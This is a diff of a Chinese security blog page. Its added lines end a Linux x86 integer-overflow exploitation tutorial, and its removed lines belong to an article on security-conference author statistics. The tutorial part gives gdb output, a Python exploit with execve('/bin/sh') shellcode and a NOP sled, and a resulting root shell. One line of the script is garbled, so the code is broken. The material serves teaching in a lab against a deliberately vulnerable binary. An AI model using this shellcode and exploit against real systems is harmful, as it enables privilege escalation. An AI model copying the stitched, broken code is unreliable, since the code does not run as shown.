+<p>这样一来，用户输入 “A” <em> 24 + “B” </em> 4 + “C” * 233，就能以一串“A”覆盖passwd_buf, passwd_len, 对齐空间和调用者的EBP，以“BBBB”覆盖返回地址，以一串C覆盖剩余空间。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/iof/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) r sploitfun `python -c 'print "A"*24 + "B"*4 + "C"*233'`</div><div class="line">Starting program: /home/sploitfun/lsploits/iof/vuln sploitfun `python -c 'print "A"*24 + "B"*4 + "C"*233'`</div><div class="line">Valid Password</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上述输出结果表明攻击者已然获得返回地址的控制权限。存储于栈(0xbffff1fc)中的返回地址已被“BBBB”覆盖。掌握了以上信息，我们就可以写出能实现任意代码执行的漏洞利用代码了。</p>
+<p><u><em>漏洞利用代码：</em></u><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py </span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">arg1 = <span class="string">"sploitfun"</span></div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = <span class="number">0xbffff274</span></div><div class="line"></div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numunk + RA + NOP's + Shellcode</div><div class="line">arg2 = <span class="string">"A"</span> * <span class="number">24</span></div><div class="line">arg2 += conv(ret_addr);</div><div class="line">arg2 += <span class="string">"\x90"</span> * <span class="number">100</span></div><div class="line">arg2 += scode</div><div class="line">arg2 += <span class="string">"C"</span> * <span class="number">108</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, arg1, arg2])</div></pre></td></tr></table></figure></p>
+<p>执行上述漏洞利用程序可以获取root shell，如下所示</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Valid Password</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p><u><em>参考文章：</em></u></p>
 <ol>
-<li>每个机构都来自美国（第一个非美国的机构ETH排名18）</li>
-<li>伯克利大学几乎在每次会议上都有论文发表（比例高于90%）</li>
-<li>只有一家公司和九家大学（3个都是加州系列大学）。然而，这是因为我人为地将一些大的公司分裂成了不同分支。如果将其名下的研究所汇总，IBM将会排名第4而微软排名第2。</li>
-<li>卡内基梅隆大学是拥有作者人数最多的机构。</li>
-<li>网络安全公司的排名如何？（RSA是网络安全公司类排名最高的，排在第31位）作为一个“系统”群体，我们很高兴看到学术界与商业界的混合。我们的群体仍然太小吗？现在的公司只对BlackHat和VirusBulletin感兴趣吗？或者说只有微软、IBM和谷歌是最主要的安全公司吗？<br>这结果显然令人感到沮丧。也许系统安全学界认为公司不懂研究，而公司认为学界的论文只是纸上谈兵，学校的教授们并不知晓现实世界的情况，也不了解公司在计算机学术会议外，已经付出的努力。我真希望这一想法是错误的。<br>尽管此数据集收录了近700个独立科研机构，但是累积分布函数显示，只有几家机构活跃在此舞台上。事实上，排名前十的机构已经占据了发表论文总数的80%（可参<em>见帕累托分布</em>)。</li>
+<li><a href="http://phrack.org/issues/60/10.html" target="_blank" rel="external">phrack-integerflow</a></li>
 </ol>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/15.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/15.png" width="450"></a><br></figure>
-
-<h3 id="团队与合作"><a href="#团队与合作" class="headerlink" title="团队与合作"></a>团队与合作</h3><p>利用这些数据，我们可以编制一个更有趣的图表：如果每位作者用一个结点来表示，那么可以用边线把有合作关系的作者连接起来。不幸的是，图表中有四千四百个结点和一万五千条线，工作量巨大!但是更有趣的是，其中85%的作者从属于一个巨大的簇群！换言之，可以通过追踪合作者找到本领域的每个人。今年只有五位作者发表了三篇以上的论文且不在这个巨网之中（去年有九位）。<br>最大的圈子（也就是标记了每个人与其他人直接关联的最大图表）与参与写作<em>Manufacturing Compromise: The Emergence of Exploit-as-a-Service</em>的十八位作者相一致。有趣的是，再没有比这个更大的网络。<br>如果想做一个更紧凑的图像，我们可以将图表压缩到只包括发表论文数量最少的作者。如果把门槛降到9篇文章，我们还是可以获得166个结点，640条连接线和直径为7的圆，仍然超出制图的限制。<br>如果我们要突显图表中的主要群体，我们需要其他途径来消除噪点。例如，我们可以选择至共同合作过<strong>5</strong>篇文章的作者为分析结点（每人总共有10篇），来查看合作的密切性。这一分析结果显示有91个结点，那么我们可以看到许多有趣的群体：（大图<a href="http://s3.eurecom.fr/~balzarot/notes/top4/main_groups.png" target="_blank" rel="external">点此</a>查看）</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/16.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/16.png" width="450"></a><br></figure>
-
-<p>仍然太大？<br>好吧，下图是选择共同合作过<strong>10</strong>篇文章的作者分析图。这里我们可以看到本领域内教授之间最有效的合作关系。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/17.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/17.png" width="450"></a><br></figure>
-
-<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul>
-<li><p><strong>如果综合谷歌学术的信息会更好</strong><br>的确如此。如果可以获得每篇论文被引用的相关数据，会提供更加有趣的数据。如有谷歌相关工作人员可以提供帮助，请随时与我联系。</p>
-</li>
-<li><p><strong>如果在作者或机构列表中发现错误怎么办？</strong><br>太好了！请将正确信息发给我，我将进行修改和更新</p>
-</li>
-<li><p><strong>为何不使用DBLP?</strong><br><a href="http://lilicoding.github.io/topresearcher/" target="_blank" rel="external">TopResearcher</a> 使用DBLP来获取包括TOP4会议在内的多数顶级会议的论文列表，然而，多年来DBLP的统计中缺失了许多作者的文章。因此，保险起见，为避免拼写错误产生的统计失误，我自己采用分析姓名的方式进行统计，与DBLP不同的是，我还罗列了每位作者的所有单位。</p>
-</li>
-<li><p><strong>采用动态生成的页面和交互式绘制会更好</strong><br>是的，我同意。如果能够采用图书馆的方式来大面积呈现可定制的图表会更好。如果使用<a href="http://www.yworks.com/products/yfiles" target="_blank" rel="external">yFiles</a>会更适合，然而即便对学术科研来讲，它也并不免费。所以，除非有人给我提供免费的使用权限，不然就无法实现。</p>
-</li>
-<li><p><strong>可以分享你的数据/代码吗？</strong><br>可以的。我计划找时间将所有的东西进行美化，然后在github上与大家分享代码和数据，但是我仅在有限的业余时间里进行此项作业。因此，我希望将这些时间更多的用来添加新数据和分析，因此，尽情期待吧……</p>
-</li>
-<li><p><strong>下一次更新会在什么时候？</strong><br>待明年CCS发布新一轮接收的论文。</p>
-</li>
-<li><p><strong>还有什么其他值得分析的吗？</strong><br>请告诉我，我喜欢绘制图表</p>
-</li>
-</ul>
 <hr>
-<p>转载本文请务必注明，文章出处：《<a href="http://www.csyssec.org/20161230/csysseccircus/" target="_blank" rel="external">计算机系统安全学术圈</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/integerflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-整型溢出利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 
       
     </div>
     <footer class="entry-meta entry-footer">
       
 	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/安全圈子/">安全圈子<span class="article-category-count">1</span></a>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
 
 
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Conference/">Conference</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Overflow/">Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
 
       
     </footer>
@@ -260,7 +973,7 @@ size:拥有在TOP4会议中发表论文的作者数量
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/14/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span>
+    <a class="extend prev" rel="prev" href="/page/14/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/16/">下一页</a>
   </nav>
 
 </section>
@@ -348,6 +1061,90 @@ size:拥有在TOP4会议中发表论文的作者数量
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/unpriviledged-ins/">非特权指令的内核信息泄露</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/hav-exception/">对硬件虚拟化异常的思考(#VE)</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/monitoring-syscall/">X86虚拟化技术监控/陷入SYSCALL的另一种方法</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/vmcs-vmxon/">VT-x技术VMXON与VMCS区域的思考-从安全的角度</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/monitoring-schduling/">使用硬件虚拟化技术无感监控Windows OS调度事件</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/mtf/">MTF在基于EPT的客户机物理内存监控中的使用</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/hardware-security-x86arm/">X86&amp;ARM架构处理器硬件安全特性</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -457,90 +1254,6 @@ size:拥有在TOP4会议中发表论文的作者数量
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170401/sandbox/">下一代沙盒</a></h6>
-          <!--  <span>四月 1, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170401/unmasking/">揭开内核漏洞利用的神秘面纱</a></h6>
-          <!--  <span>四月 1, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170331/raid/">RAID十年录用论文</a></h6>
-          <!--  <span>三月 31, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170330/kernelmalware/">内核层恶意代码分析</a></h6>
-          <!--  <span>三月 30, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170330/poker/">内核Rootkit行为的多方面解析</a></h6>
-          <!--  <span>三月 30, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170315/valgrind-memcheck/">如何使用Valgrind memcheck工具进行C/C++的内存漏洞检测</a></h6>
-          <!--  <span>三月 15, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170312/phd-expectations-realities/">PhD expectations and reality</a></h6>
-          <!--  <span>三月 12, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -551,7 +1264,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">分类导航</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件特性/">硬件特性</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件虚拟化/">硬件虚拟化</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -561,7 +1274,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 11.67px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.83px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.5px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.33px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.5px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.83px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.83px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.17px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.67px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.83px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.33px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.67px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.83px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.83px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.83px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.5px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.83px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.67px;">Rootkit</a> <a href="/tags/Sandbox/" style="font-size: 10.83px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.83px;">Stack</a> <a href="/tags/System/" style="font-size: 19.17px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.67px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.33px;">Virtualization</a> <a href="/tags/Virtulization/" style="font-size: 10.83px;">Virtulization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 11.67px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.73px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exception/" style="font-size: 10px;">Exception</a> <a href="/tags/Exploit/" style="font-size: 18.18px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/HAV/" style="font-size: 12.73px;">HAV</a> <a href="/tags/Hardware/" style="font-size: 11.82px;">Hardware</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.91px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 17.27px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 16.36px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.45px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.82px;">Migration</a> <a href="/tags/Monitoring/" style="font-size: 11.82px;">Monitoring</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.91px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.91px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 16.36px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.82px;">Rootkit</a> <a href="/tags/Sandbox/" style="font-size: 10.91px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/Syscall/" style="font-size: 10px;">Syscall</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/VT-x/" style="font-size: 10px;">VT-x</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 19.09px;">Virtualization</a> <a href="/tags/Virtulization/" style="font-size: 11.82px;">Virtulization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 11.82px;">XEN</a>
     </div>
   </div>
 
